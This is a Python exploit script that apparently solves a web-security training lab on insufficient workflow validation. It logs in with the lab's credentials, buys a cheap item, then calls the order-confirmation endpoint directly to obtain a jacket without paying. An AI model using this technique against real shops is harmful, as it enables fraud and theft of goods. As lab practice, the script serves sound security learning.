import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def get_csrf(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf_token = soup.find("input", {'name' : 'csrf'})['value']
    return csrf_token



def purchase_jacket(s, url):
    # LOGIN AS USER 'WIENER'
    login_url = url + "/login"
    params = {
        'csrf' : get_csrf(s, login_url),
        'username' : 'wiener',
        'password' : 'peter'
    }
    r = s.post(login_url, data=params, verify=False, proxies=proxies)

    # CHECK IF LOGIN WAS SUCCESSFUL
    if "Log out" and "wiener" not in r.text:
        print("[-] Error! Could not log-in!")
        sys.exit(-1)
    print("[+] Logged-in as the user wiener")

    # ADD SOMETHING CHEAP TO CART
    cart_url = url + "/cart"
    params = {
        'productId' : 2,
        'redir' : 'PRODUCT',
        'quantity' : 1
    }
    r = s.post(cart_url, data=params, verify=False, proxies=proxies)
    
    # CHECK IF ITEM WAS ADDED TO CART
    if r.status_code != 200:
        print("[-] Something happened! Exiting")
        sys.exit(-1)

    # PURCHASE ITEM
    checkout_url = url + "/cart/checkout"
    params = {
        'csrf' : get_csrf(s, cart_url)
    }
    r = s.post(checkout_url, data=params, verify=False, proxies=proxies)

    # CHECK IF PURCHASE WAS SUCCESSFUL
    if "Your order is on its way!" not in r.text:
        print("[-] Ooopsie! Purchase failed")
        sys.exit(-1)

    print("[+] Purchase completed! Now to exploit the vulnerability")
    print("[+] We are going to add the jacket, call the order confirmation again and have the jacket for free")

    # ADD JACKET TO CART
    params = {
        'productId' : 1,
        'redir' : 'PRODUCT',
        'quantity' : 1
    }
    r = s.post(cart_url, data=params, verify=False, proxies=proxies)

    # CHECK CART
    if r.status_code != 200:
        print("[-] Jacket not added")
        sys.exit(-1)
    
    # CALL THE ORDER CONFIRMATION BEFORE CHECKOUT
    order_confirmatioin_url = url + "/cart/order-confirmation?order-confirmed=true"
    r = s.get(order_confirmatioin_url, verify=False, proxies=proxies)

    # CHECK PURCHASE
    if "Your order is on its way!" not in r.text:
        print("[-] Could not buy the jacket!")
        sys.exit(-1)

    print("[+] Exploit succeded!")



def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()

    url = sys.argv[1].strip()

    print("[+] Lab: Insufficient workflow validation")
    print("""[+] This lab makes flawed assumptions about the sequence of events in the purchasing workflow.
    To solve the lab, exploit this flaw to buy a "Lightweight l33t leather jacket".
    
    You can log in to your own account using the following credentials: wiener:peter""")
    
    purchase_jacket(s, url)



if __name__ == "__main__":
    main()